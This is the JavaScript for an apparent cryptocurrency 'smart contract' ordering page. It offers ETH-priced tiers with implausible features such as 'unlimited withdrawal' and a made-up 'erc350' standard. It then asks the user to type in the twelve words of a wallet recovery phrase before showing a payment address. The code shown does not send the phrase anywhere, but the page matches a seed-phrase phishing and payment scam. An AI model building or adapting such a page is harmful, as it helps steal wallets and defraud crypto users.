let currentCurrency = "USD";
let ethToRates = { USD: 3600, CAD: 4900, EUR: 3400 };

function goToStep2() {
  document.getElementById("step1").classList.add("hidden");
  document.getElementById("step2").classList.remove("hidden");
  renderOptions();
}

function toggleCurrency() {
  const order = ["USD", "CAD", "EUR"];
  let index = (order.indexOf(currentCurrency) + 1) % order.length;
  currentCurrency = order[index];
  document.getElementById("currency").textContent = currentCurrency;
  renderOptions();
}

function convertEthToCurrency(eth) {
  return (eth * ethToRates[currentCurrency]).toFixed(2);
}

function renderOptions() {
  const type = document.getElementById("contractType").value;
  const container = document.getElementById("contractOptions");
  container.innerHTML = "";

  const data = {
    erc20: [
      { name: "Normal", eth: 1.5, desc: "Basic transfer functionality<br>Limited customization<br>Standard gas fees apply" },
      { name: "Medium", eth: 2.1, desc: "Optimized transfer & basic airdrop capability<br>Reduced gas costs<br>Moderate customization" },
      { name: "Trader", eth: 3.4, desc: "Unlimited withdrawal<br>No gas fee for any transaction<br>Auto-market integration" }
    ],
    erc350: [
      { name: "Normal", eth: 0.6, desc: "Simple one-time withdrawal<br>Basic security measures" },
      { name: "Medium", eth: 1.0, desc: "Scheduled withdrawals<br>Custom token support" },
      { name: "Expert", eth: 3.4, desc: "High-value transfers<br>Gasless bulk withdrawals" }
    ],
    erc721: [
      { name: "Basic", eth: 0.9, desc: "Mint & transfer<br>No marketplace integration" },
      { name: "Gallery", eth: 1.7, desc: "Metadata customization<br>On-chain metadata support" },
      { name: "Pro", eth: 2.8, desc: "Royalty support<br>No minting fee to users<br>Custom artwork binding" }
    ],
    dao: [
      { name: "Simple DAO", eth: 1.2, desc: "Voting + member control" },
      { name: "Enhanced DAO", eth: 2.2, desc: "Weighted votes + Proposal Management" },
      { name: "Governance Expert", eth: 3.5, desc: "Token-weighted governance<br>Built-in treasury<br>No gas for votes" }
    ],
    staking: [
      { name: "Basic Pool", eth: 1.0, desc: "Manual stake/reward" },
      { name: "Dynamic Pool", eth: 1.8, desc: "Auto-reward calculator<br>Token lockups" },
      { name: "Expert Staking", eth: 3.3, desc: "Multi-token staking<br>Gasless claiming" }
    ],
    ico: [
      { name: "Basic Sale", eth: 1.4, desc: "Token sale with cap<br>ETH only" },
      { name: "Standard Launch", eth: 2.5, desc: "Multi-token support<br>Whitelist capability" },
      { name: "Expert Launchpad", eth: 3.8, desc: "Auto token release<br>Anti-bot<br>Liquidity auto-lock" }
    ]
  };

  const options = data[type] || [];

  options.forEach(opt => {
    const div = document.createElement("div");
    div.classList.add("tier");
    div.innerHTML = `
      <h3>${opt.name} – ${opt.eth} ETH (${convertEthToCurrency(opt.eth)} ${currentCurrency})</h3>
      <p>${opt.desc}</p>
      <button onclick="goToStep3('${opt.name}', ${opt.eth})">Choose</button>
    `;
    container.appendChild(div);
  });
}

function goToStep3(name, eth) {
  window.selectedContract = { name, eth };
  document.getElementById("step2").classList.add("hidden");
  document.getElementById("step3").classList.remove("hidden");

  const inputs = document.getElementById("mnemonicInputs");
  inputs.innerHTML = "";
  for (let i = 1; i <= 12; i++) {
    inputs.innerHTML += `<input placeholder="${i}" required />`;
  }
}

document.getElementById("detailsForm").onsubmit = function (e) {
  e.preventDefault();
  document.getElementById("step3").classList.add("hidden");
  document.getElementById("step4").classList.remove("hidden");

  document.getElementById("selectedContract").textContent = selectedContract.name;
  document.getElementById("ethAmount").textContent = selectedContract.eth;
  generateQR("0x123456789abcdef000");
};

function copyAddress() {
  navigator.clipboard.writeText("0x123456789abcdef000");
  alert("Address copied!");
}

function generateQR(address) {
  const ctx = document.getElementById("qrcode").getContext("2d");
  ctx.fillStyle = "#213448";
  ctx.fillRect(10, 10, 100, 100);
}
